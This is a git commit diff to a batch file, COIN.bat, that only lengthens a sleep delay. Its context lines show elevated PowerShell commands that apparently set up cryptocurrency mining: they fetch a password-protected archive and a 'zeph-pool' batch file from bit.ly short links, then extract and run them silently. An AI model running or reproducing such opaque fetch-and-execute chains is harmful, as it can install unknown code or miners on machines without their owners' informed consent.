2f447cecbc8c3bc1502ed76650b9ddbfe4a7f592
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2024-12-18 15:23:40 +0700

    COIN.bat

--- COIN.bat
+++ COIN.bat
@@ -13,7 +13,7 @@ powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://www.win-rar.com/
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri https://bit.ly/2miners-github -OutFile C:\setup.rar"
 powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -p2miners -ibck -y 'C:\setup.rar' 'C:\'"
-powershell -NoProfile -Command "Start-Sleep -Seconds 4"
+powershell -NoProfile -Command "Start-Sleep -Seconds 7"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri https://bit.ly/zeph-pool -OutFile C:\zeph-pool.bat"
 powershell -NoProfile -Command "Copy-Item -Path C:\zeph-pool.bat -Destination C:\Setup\Zephyr\zeph-pool.bat -Force"
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\Setup\Zephyr\zeph-pool.bat' -ArgumentList '/S' -Verb RunAs"
